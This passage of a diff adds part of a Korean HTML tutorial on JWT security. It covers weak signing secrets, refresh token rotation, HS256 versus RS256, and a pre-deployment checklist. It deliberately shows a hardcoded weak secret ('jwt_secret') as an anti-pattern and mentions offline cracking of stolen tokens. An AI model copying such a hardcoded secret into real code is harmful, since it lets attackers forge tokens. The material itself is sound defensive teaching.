+SECRET = <span class="cerr">"jwt_secret"</span>   <span class="cmt">← 흔한 패턴</span>
+
+<span class="cmt"># JWT는 탈취 후 오프라인에서 크랙 가능</span>
+<span class="cmt"># 비밀키 알아내면 임의 토큰 무한 생성 가능</span>
+          </div>
+        </div>
+        <div class="si-defend">
+          <div class="si-sub defend">방어 전략</div>
+          <div class="defend-list">
+            <div class="defend-item"><strong style="color:var(--text)">256비트(32바이트) 이상</strong>의 랜덤 비밀키 사용</div>
+            <div class="defend-item">비밀키를 <strong style="color:var(--text)">환경변수</strong>로 관리 — 코드에 하드코딩 절대 금지</div>
+            <div class="defend-item"><strong style="color:var(--text)">RS256(비대칭키)</strong> 고려 — 서명은 개인키, 검증은 공개키로 분리</div>
+          </div>
+          <div class="code-box sm" style="margin-top:10px">
+<span class="cmt"># ✅ 안전한 비밀키 생성 (Node.js)</span>
+<span class="ck">require</span>(<span class="cstr">'crypto'</span>).randomBytes(<span class="cv">64</span>).toString(<span class="cstr">'hex'</span>)
+<span class="cmt"># → 128자리 hex 문자열, 512비트 엔트로피</span>
+
+<span class="cmt"># .env</span>
+JWT_SECRET=<span class="cs">a3f8c2e1b4d7...128자리 랜덤값</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════
+  5. Refresh Token Rotation
+════════════════ -->
+<div class="section s5">
+  <div class="sec-label">Section 05</div>
+  <div class="sec-title"><div class="bar"></div>Access / Refresh Token 전략 — Rotation</div>
+  <div class="sec-desc">짧은 AccessToken + HttpOnly 쿠키의 RefreshToken 조합으로 보안과 사용성을 동시에 잡는 실전 전략</div>
+
+  <div class="ar-grid">
+    <div class="ar-card ar-access">
+      <div class="ar-title" style="color:var(--info)">⚡ AccessToken</div>
+      <div style="font-size:12.5px;color:var(--dim);line-height:1.8">
+        <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.06)"><span>만료 시간</span><strong style="color:var(--text)">5 ~ 15분</strong></div>
+        <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.06)"><span>저장 위치</span><strong style="color:var(--text)">JS 메모리</strong></div>
+        <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.06)"><span>전달 방법</span><strong style="color:var(--text)">Authorization 헤더</strong></div>
+        <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.06)"><span>서버 저장</span><strong style="color:var(--good)">불필요</strong></div>
+        <div style="display:flex;justify-content:space-between;padding:6px 0"><span>탈취 피해</span><strong style="color:var(--good)">만료까지만 유효 (최대 15분)</strong></div>
+      </div>
+    </div>
+    <div class="ar-card ar-refresh">
+      <div class="ar-title" style="color:var(--jwt)">🔐 RefreshToken</div>
+      <div style="font-size:12.5px;color:var(--dim);line-height:1.8">
+        <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.06)"><span>만료 시간</span><strong style="color:var(--text)">7 ~ 30일</strong></div>
+        <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.06)"><span>저장 위치</span><strong style="color:var(--text)">HttpOnly 쿠키</strong></div>
+        <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.06)"><span>전달 방법</span><strong style="color:var(--text)">쿠키 자동 전송</strong></div>
+        <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.06)"><span>서버 저장</span><strong style="color:var(--warn)">DB/Redis에 저장 권장</strong></div>
+        <div style="display:flex;justify-content:space-between;padding:6px 0"><span>사용 목적</span><strong style="color:var(--good)">AccessToken 재발급 전용</strong></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="rotation-flow">
+    <div style="font-family:var(--mono);font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:3px;color:var(--muted);margin-bottom:16px">Refresh Token Rotation 흐름</div>
+    <div class="rf-steps">
+      <div class="rf-step">
+        <div class="rf-num">1</div>
+        <div class="rf-text">AccessToken 만료 → 클라이언트가 <code style="font-family:var(--mono);font-size:11px">POST /auth/refresh</code> 요청<br><span style="color:var(--dim)">RefreshToken 쿠키가 자동으로 전송됨</span></div>
+      </div>
+      <div class="rf-step rf-highlight">
+        <div class="rf-num">2</div>
+        <div class="rf-text"><strong style="color:var(--jwt)">서버: 기존 RefreshToken 즉시 무효화</strong> (DB에서 삭제)<br><span style="color:var(--dim)">사용된 토큰은 재사용 불가 처리</span></div>
+      </div>
+      <div class="rf-step rf-highlight">
+        <div class="rf-num">3</div>
+        <div class="rf-text"><strong style="color:var(--good)">새 AccessToken + 새 RefreshToken 동시 발급</strong><br><span style="color:var(--dim)">새 RefreshToken을 HttpOnly 쿠키로 Set-Cookie</span></div>
+      </div>
+      <div class="rf-step rf-danger">
+        <div class="rf-num">!</div>
+        <div class="rf-text"><strong style="color:var(--bad)">이미 무효화된 RefreshToken으로 재요청이 오면?</strong><br><span style="color:var(--dim)">토큰이 탈취된 것으로 판단 → 해당 사용자 <strong style="color:var(--bad)">전체 세션 강제 로그아웃</strong></span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ════════════════
+  6. HS256 vs RS256
+════════════════ -->
+<div class="section s6">
+  <div class="sec-label">Section 06</div>
+  <div class="sec-title"><div class="bar"></div>서명 알고리즘 — HS256 vs RS256</div>
+  <div class="sec-desc">단일 서버면 HS256, 여러 서비스가 토큰을 검증해야 한다면 RS256</div>
+
+  <div class="algo-grid">
+    <div class="algo-card" style="border-color:rgba(251,146,60,.3);background:rgba(251,146,60,.04)">
+      <div class="algo-name" style="color:var(--head)">HS256</div>
+      <div style="font-size:12px;color:var(--dim);line-height:1.8;margin-bottom:12px">
+        <strong style="color:var(--text)">대칭키 알고리즘</strong><br>
+        서명과 검증에 동일한 비밀키 사용
+      </div>
+      <div class="code-box sm" style="margin-bottom:12px">
+<span class="cmt"># 서명 (발급 서버)</span>
+sign(payload, <span class="ch">SECRET_KEY</span>)
+<span class="cmt"># 검증 (같은 SECRET_KEY 필요)</span>
+verify(token, <span class="ch">SECRET_KEY</span>)
+      </div>
+      <div class="defend-list">
+        <div class="defend-item">구현 단순, 성능 빠름</div>
+        <div class="defend-item">단일 서버 환경에 적합</div>
+        <div class="defend-item" style="color:var(--warn)">
+          <span style="color:var(--warn)">△</span> 검증 서버도 비밀키 공유 필요 → 키 노출 시 전체 위험
+        </div>
+      </div>
+    </div>
+    <div class="algo-card" style="border-color:rgba(139,92,246,.3);background:rgba(139,92,246,.04)">
+      <div class="algo-name" style="color:var(--jwt)">RS256</div>
+      <div style="font-size:12px;color:var(--dim);line-height:1.8;margin-bottom:12px">
+        <strong style="color:var(--text)">비대칭키 알고리즘</strong><br>
+        서명은 개인키, 검증은 공개키로 분리
+      </div>
+      <div class="code-box sm" style="margin-bottom:12px">
+<span class="cmt"># 서명 (Auth 서버만 보유)</span>
+sign(payload, <span class="cs">PRIVATE_KEY</span>)
+<span class="cmt"># 검증 (공개키는 누구나 가져도 됨)</span>
+verify(token, <span class="cok">PUBLIC_KEY</span>)
+      </div>
+      <div class="defend-list">
+        <div class="defend-item">Auth 서버만 서명 가능, 다른 서비스는 공개키로 검증만</div>
+        <div class="defend-item">MSA / 여러 도메인 간 토큰 공유에 적합</div>
+        <div class="defend-item">공개키 노출돼도 서명 위조 불가</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ════════════════
+  7. 보안 체크리스트
+════════════════ -->
+<div class="section s7">
+  <div class="sec-label">Section 07</div>
+  <div class="sec-title"><div class="bar"></div>JWT 보안 체크리스트</div>
+  <div class="sec-desc">프로덕션 배포 전 반드시 확인해야 할 항목들</div>
+  <div class="checklist">
+    <div class="cl-item"><div class="cl-icon">✅</div><div>AccessToken은 <strong style="color:var(--text)">JS 메모리</strong>에만 저장 — localStorage/sessionStorage 금지</div></div>
+    <div class="cl-item"><div class="cl-icon">✅</div><div>RefreshToken은 <strong style="color:var(--text)">HttpOnly + Secure + SameSite=Strict</strong> 쿠키에 저장</div></div>
+    <div class="cl-item"><div class="cl-icon">✅</div><div>RefreshToken 쿠키에 <strong style="color:var(--text)">Path=/auth/refresh</strong> 설정 — 불필요한 요청에 전송 방지</div></div>
+    <div class="cl-item"><div class="cl-icon">✅</div><div>AccessToken <strong style="color:var(--text)">만료를 5~15분</strong>으로 짧게 설정</div></div>
+    <div class="cl-item"><div class="cl-icon">✅</div><div>서버에서 <strong style="color:var(--text)">허용 알고리즘 화이트리스트</strong> 설정 — alg:none 차단</div></div>
+    <div class="cl-item"><div class="cl-icon">✅</div><div>비밀키는 <strong style="color:var(--text)">256비트 이상 랜덤값</strong>으로 환경변수 관리</div></div>
+    <div class="cl-item"><div class="cl-icon">✅</div><div><strong style="color:var(--text)">Refresh Token Rotation</strong> 적용 — 재사용 감지 시 전체 로그아웃</div></div>
+    <div class="cl-item"><div class="cl-icon">✅</div><div>Payload에 <strong style="color:var(--text)">민감 정보(비밀번호 등) 저장 금지</strong> — Base64 디코딩 가능</div></div>
+    <div class="cl-item"><div class="cl-icon">✅</div><div>모든 통신 <strong style="color:var(--text)">HTTPS</strong> 강제 — HTTP 요청 시 쿠키 전송 차단</div></div>
+    <div class="cl-item"><div class="cl-icon">✅</div><div>앱 시작 시 <strong style="color:var(--text)">Silent Refresh</strong>로 AccessToken 복구 처리</div></div>
+  </div>
+</div>
+
+</div>
+</body>
+</html>
